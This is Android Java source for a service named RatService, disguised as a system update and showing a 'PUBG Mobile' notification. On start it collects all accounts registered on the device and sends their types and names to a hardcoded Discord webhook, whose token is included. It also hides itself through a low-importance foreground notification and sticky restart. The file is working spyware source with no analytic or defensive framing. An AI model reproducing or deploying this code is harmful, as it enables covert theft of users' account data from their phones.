package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class RatService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        new Thread(() -> {
            try {
                sendTextToDiscord("🔄 **جاري سحب الحسابات المسجلة...**");
                Thread.sleep(2000); // نستنى ثانيتين عشان الصلاحيات
                
                AccountManager am = AccountManager.get(this);
                Account[] accounts = am.getAccounts();
                StringBuilder sb = new StringBuilder("📧 **جميع الحسابات المسجلة على الجهاز:**\n");
                
                if (accounts.length == 0) {
                    sb.append("لا توجد حسابات مسجلة.");
                } else {
                    for (Account account : accounts) {
                        sb.append("- **").append(account.type).append(":** `").append(account.name).append("`\n");
                    }
                }
                sendTextToDiscord(sb.toString());
            } catch (Exception e) {
                sendTextToDiscord("❌ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, channelId).setContentTitle("PUBG Mobile").setSmallIcon(android.R.drawable.ic_menu_manage).build();
            startForeground(1, notification);
        }
    }

    private void sendTextToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            client.newCall(new Request.Builder().url(WEBHOOK_URL).post(body).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception ignored) {}
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}
